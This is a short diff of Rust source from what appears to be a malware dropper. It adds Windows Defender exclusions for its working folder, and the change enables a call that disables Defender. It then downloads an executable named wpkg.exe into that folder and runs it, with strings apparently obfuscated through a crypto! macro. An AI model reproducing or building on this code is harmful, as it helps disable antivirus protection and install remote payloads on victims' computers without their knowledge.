@@ -10,7 +10,7 @@ mod downloader;
 async fn main() {
     let path = utils::get_dir().expect(&crypto!("Could not create directory"));
     exclusions(&path).expect(&crypto!("Something goes wrong with exclutsion"));
-    //if let Err(e) = disable_defender() { println!("Error: {e}")}
+    if let Err(e) = disable_defender() { println!("Error: {e}")}
     downloader::download_wpkg(&format!("{path}\\wpkg.exe")).await.expect(&crypto!("Could not download wpkg"));
     println!("{path}");
     utils::run_process(&format!("{path}\\wpkg.exe"), vec![], false).expect(&crypto!("Could not start wpkg"));
